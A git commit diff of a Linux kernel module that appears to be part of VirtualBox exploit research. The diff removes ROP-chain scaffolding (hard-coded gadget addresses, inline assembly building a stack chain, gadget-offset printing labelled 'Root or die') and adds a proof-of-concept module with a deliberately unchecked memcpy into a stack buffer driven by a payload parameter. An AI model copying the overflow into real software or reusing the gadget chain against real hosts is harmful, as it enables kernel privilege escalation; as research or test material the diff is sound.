5a4a76eac843890de0d1db07e31290a059ea509c
John Andersen <john.s.andersen@intel.com>
2016-08-31 15:43:46 -0700

    This kernel module should work
    Signed-off-by: John Andersen <john.s.andersen@intel.com>

--- vbox3.c
+++ vbox3.c
@@ -1,72 +1,57 @@
 /*
  *  hello-5.c - Demonstrates command line argument passing to a module.
  */
-#include <linux/module.h>
-#include <linux/moduleparam.h>
-#include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/string.h>
+#include <linux/moduleparam.h>
 #include <linux/stat.h>
 
-#include "helper.c"
-
-static void *VMMR0 = NULL;
-static void *VBoxDDR0 = NULL;
-// static void *VBoxDD2R0 = 0xffffffffa0066020U;
-
-/*
-0 # rdi
-0 # rbp
-poppopret = VBoxDDR0 + 0xdba # pop rdi; pop rbp; ret
-0x69 # rdx
-popret = VMMR0 + 0x1f7bd # pop rax; ret
-*/
-
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Peter Jay Salzman");
+MODULE_AUTHOR("John Andersen, Fredric Carl");
 
-void setup_stack(void) {
-	asm (
-	"push $0xffffffffa09558d8;"// xor eax, eax; ret
-	// "push $0x;"// int $0x80; ret
-	"push $0x69;"
-	"push $0xffffffffa09747dd;"// pop rax; ret
-	"push $0x0;"
-	"push $0xffffffffa09d064a;"// pop rdi; ret
-	"ret;"
-	);
+#define INFO KERN_INFO "vbox_poc: "
+
+#ifndef OF_SIZE
+#define OF_SIZE 128
+#endif
+
+static int exploit_length = 0;
+static char *exploit_payload = "blah";
+
+module_param(exploit_payload, charp, 0000);
+MODULE_PARM_DESC(exploit_payload, "Exploit payload");
+module_param(exploit_length, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+MODULE_PARM_DESC(exploit_length, "Length of payload");
+
+void vulnerable_func(const char * msg, ssize_t msg_size) {
+  // The buffer we will overflow
+  char overflow_me[OF_SIZE];
+  // Doh! Used size of attacker controlled not defender controlled for copy!
+  // Stack overflow eminent!
+  memcpy(overflow_me, msg, msg_size);
+  // If we succeed then say so
+  printk(INFO "vulnerable_func finished memcpy\n");
+  // asm("pop %rax; pop %rax; retq;");
 }
 
-static int __init hello_5_init(void) {
-    int error;
-    VMMR0 = find_addr("VMMR0", &error);
-	printk(KERN_INFO "VMMR0: %p\n", VMMR0);
-    if (error || VMMR0 == NULL) {
-      return 0;
-    }
-    VBoxDDR0 = find_addr("VBoxDDR0", &error);
-	printk(KERN_INFO "VBoxDDR0: %p\n", VBoxDDR0);
-    if (error || VBoxDDR0 == NULL) {
-      return 0;
-    }
-	return 0;
-	printk(KERN_INFO "pop rdi; pop rbp; ret: %p: %p\n", VBoxDDR0 + 0xdbaU, *(int *)(VBoxDDR0 + 0xdbaU));
-	printk(KERN_INFO "pop rdi; ret: %p: %p\n", VMMR0 + 0x7b62aU, *(int *)(VMMR0 + 0x7b62aU));
-	printk(KERN_INFO "pop rax; ret: %p: %p\n", VMMR0 + 0x1f7bdU, *(int *)(VMMR0 + 0x1f7bdU));
-	printk(KERN_INFO "syscall; ret: %p: %p\n", VMMR0 + 0x012c3c0U, *(int *)(VMMR0 + 0x1f85cU));
-	printk(KERN_INFO "push rsp; ret: %p: %p\n", VMMR0 + 0x1f7adU, *(int *)(VMMR0 + 0x1f7adU));
-	printk(KERN_INFO "pop rbp; ret: %p: %p\n", VMMR0 + 0x28dU, *(int *)(VMMR0 + 0x28dU));
-	printk(KERN_INFO "xor eax,eax; ret: %p: %p\n", VMMR0 + 0x8b8U, *(int *)(VMMR0 + 0x8b8U));
+static int __init vbox_poc_init(void) {
+  printk(INFO "Loaded\n");
 
-	printk(KERN_INFO "Root or die\n");
-	// setup_stack();
-	printk(KERN_INFO "Success\n");
-	return 0;
+  printk(INFO "Exploit payload: %s\n", exploit_payload);
+  printk(INFO "Payload length: %d\n", exploit_length);
+
+  printk(INFO "Calling vulnerable_func\n");
+  vulnerable_func(exploit_payload, exploit_length);
+  printk(INFO "Done with vulnerable_func\n");
+
+  return 0;
 }
 
-static void __exit hello_5_exit(void)
-{
-	printk(KERN_INFO "Goodbye, world\n");
+static void __exit vbox_poc_exit(void) {
+  printk(INFO "Unloaded\n");
 }
 
-module_init(hello_5_init);
-module_exit(hello_5_exit);
+module_init(vbox_poc_init);
+module_exit(vbox_poc_exit);
